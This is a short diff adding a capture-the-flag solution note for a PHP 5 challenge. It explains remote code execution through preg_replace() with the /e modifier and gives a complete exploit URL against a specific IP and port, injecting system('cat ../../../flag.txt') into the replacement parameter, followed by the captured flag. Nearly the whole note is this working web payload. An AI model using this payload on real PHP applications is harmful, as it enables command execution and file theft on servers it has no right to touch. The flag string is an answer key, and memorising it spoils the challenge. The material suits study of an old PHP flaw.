@@ -1,0 +1,6 @@
+# vuln in php 5
+// this is RCE (remote code execute) with preg_replace() function and /e modifier for running eval code php
+// send this and get the flag
+http://103.145.226.168:3021/?pat=/./e&rep=system("cat ../../../flag.txt")&sub=a
+
+STIKOMFEST{Wad0h_RCE_D4r1_r3G3X_btw_aku_suka_lagu_iu_yang_blu3m1ng} 
